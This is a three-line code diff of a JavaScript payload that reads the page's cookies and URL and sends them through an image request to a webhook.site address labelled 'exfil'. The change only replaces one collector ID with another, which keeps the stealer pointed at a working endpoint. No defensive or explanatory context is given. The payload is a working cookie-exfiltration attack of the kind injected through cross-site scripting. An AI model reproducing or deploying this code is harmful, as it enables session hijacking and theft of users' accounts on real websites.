@@ -1,3 +1,3 @@
 var d = document.cookie;
 var u = location.href;
-new Image().src='https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/exfil?c='+encodeURIComponent(d)+'&u='+encodeURIComponent(u);
+new Image().src='https://webhook.site/b4c6b90a-ffcd-4349-ae47-81e46d0a9094/exfil?c='+encodeURIComponent(d)+'&u='+encodeURIComponent(u);
